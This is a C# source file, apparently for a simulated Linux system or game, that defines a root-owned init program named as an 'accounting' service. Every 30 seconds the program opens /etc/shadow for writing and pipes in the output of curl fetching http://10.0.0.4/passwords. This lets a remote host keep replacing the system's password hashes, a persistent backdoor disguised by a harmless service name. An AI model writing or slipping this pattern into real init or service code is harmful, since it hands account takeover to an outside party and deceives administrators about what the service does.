using System.Threading;
using Linux;
using Linux.Configuration;
using Linux.IO;
using Linux.Library;
using Linux.FileSystem;
using Linux.Sys.RunTime;

public class AccountingInitBin : CompiledBin {
    public AccountingInitBin(
        string absolutePath,
        int uid,
        int gid,
        int permission,
        FileType type
    ) : base(absolutePath, uid, gid, permission, type) { }

    public override int Execute(UserSpace userSpace) {
        bool eventSet = true;

        userSpace.Api.Trap(
            ProcessSignal.SIGTERM,
            (int[] args) => {
                eventSet = false;
            }
        );

        int pid, fd;

        while (eventSet) {
            fd = userSpace.Api.Open("/etc/shadow", AccessMode.O_WRONLY);

            pid = userSpace.Api.StartProcess(
                new string[] {
                    "/usr/bin/curl",
                    "http://10.0.0.4/passwords"
                },
                0,
                fd,
                2
            );

            userSpace.Api.WaitPid(pid);

            Thread.Sleep(30000);
        }

        return 0;
    }
}

public class AccountingInit : KernelInit {
    public override CompiledBin Init() {
        return new AccountingInitBin(
            "/run/init",
            0,
            0,
            Perm.FromInt(7, 5, 5),
            FileType.F_REG
        );
    }
}